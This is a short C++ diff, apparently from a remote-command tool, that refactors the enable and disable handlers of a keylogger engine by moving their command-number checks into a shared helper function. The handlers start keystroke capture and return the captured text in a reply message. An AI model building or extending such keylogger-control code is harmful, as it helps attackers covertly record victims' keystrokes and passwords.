@@ -189,14 +189,7 @@ std::string KeyloggerEngine::extract(int length) {
 
 int EnableKeyloggerHandler(const Message& inputMessage, Message& outputMessage) {
     json outputJson;
-
-    if(inputMessage.commandNumber !=  MessageEnableKeylog) {
-        outputMessage.commandNumber = MessageEnableKeylog;
-        outputMessage.returnCode = 0;
-        outputJson["errorString"] = "Wrong command sent?";
-        outputMessage.setJsonData(outputJson);
-        return 0;
-    }
+    if(!preliminaryEngineMessageCheck(MessageEnableKeylog, inputMessage, outputMessage, outputJson)) return 0;
 
     if(KeyloggerEngine::getInstance().init()) {
         outputMessage.commandNumber = MessageEnableKeylog;
@@ -213,14 +206,7 @@ int EnableKeyloggerHandler(const Message& inputMessage, Message& outputMessage) 
 
 int DisableKeyloggerHandler(const Message& inputMessage, Message& outputMessage) {
     json outputJson;
-
-    if(inputMessage.commandNumber !=  MessageDisableKeylog) {
-        outputMessage.commandNumber = MessageDisableKeylog;
-        outputMessage.returnCode = 0;
-        outputJson["errorString"] = "Wrong command sent?";
-        outputMessage.setJsonData(outputJson);
-        return 0;
-    }
+    if(!preliminaryEngineMessageCheck(MessageDisableKeylog, inputMessage, outputMessage, outputJson)) return 0;
 
     KeyloggerEngine::getInstance().shouldStop();
     std::string capture = KeyloggerEngine::getInstance().read();
